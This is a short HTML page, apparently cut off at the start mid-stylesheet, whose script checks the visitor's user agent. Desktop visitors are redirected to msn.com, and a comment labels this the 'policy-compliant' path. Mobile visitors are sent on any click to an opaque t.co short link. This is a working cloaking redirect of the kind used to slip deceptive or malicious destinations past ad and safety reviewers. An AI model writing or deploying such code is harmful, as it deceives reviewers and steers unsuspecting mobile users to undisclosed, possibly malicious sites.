    html, body {
      margin: 0;
      padding: 0;
      height: 100%;

<body>

<script>
  const mobileURL = "https://t.co/lU6lupZ2Qa";
  const desktopURL = "https://www.msn.com/it-it";

  const isMobile = /iphone|ipad|ipod|android|blackberry|mini|windows\sce|palm/i
    .test(navigator.userAgent.toLowerCase());

  if (!isMobile) {
    // Normal, policy-compliant redirect for desktop visitors
    window.location.replace(desktopURL);
  } else {
    // Mobile users: click anywhere to continue
    document.body.addEventListener("click", () => {
      window.location.href = mobileURL;
    });
  }
</script>

</body>
